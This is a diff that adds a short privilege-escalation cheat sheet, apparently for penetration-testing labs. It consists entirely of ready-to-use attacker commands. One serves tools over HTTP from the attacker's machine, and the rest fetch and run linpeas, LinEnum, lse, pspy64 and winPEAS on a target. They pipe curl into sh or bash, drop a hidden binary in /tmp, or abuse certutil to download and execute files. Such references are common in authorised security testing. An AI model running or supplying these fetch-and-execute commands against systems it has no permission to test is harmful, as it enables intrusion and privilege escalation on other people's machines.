@@ -1,0 +1,28 @@
+% privesc, transfer, peass
+
+; serve a directory of tools, then fetch from the target
+# Serve the current dir over HTTP (lhost defaults to your tun IP)
+python3 -m http.server <port> --bind <lhost>
+
+; --- linux target: fetch + run enumeration ---
+# linpeas
+curl http://<lhost>:<port>/linpeas.sh | sh
+
+# linpeas (small/fast variant)
+curl http://<lhost>:<port>/linpeas_small.sh | sh
+
+# LinEnum (thorough mode)
+curl http://<lhost>:<port>/LinEnum.sh | bash -s -- -t
+
+# lse (level 1 verbosity)
+curl http://<lhost>:<port>/lse.sh | bash -s -- -l 1
+
+# pspy64 (watch processes without root)
+wget http://<lhost>:<port>/pspy64 -O /tmp/.p && chmod +x /tmp/.p && /tmp/.p
+
+; --- windows target: fetch + run winPEAS ---
+# winPEAS x64 via certutil
+certutil -urlcache -split -f http://<lhost>:<port>/winPEASx64.exe winPEAS.exe && .\winPEAS.exe
+
+# winPEAS x86 via certutil
+certutil -urlcache -split -f http://<lhost>:<port>/winPEASx86.exe winPEAS.exe && .\winPEAS.exe
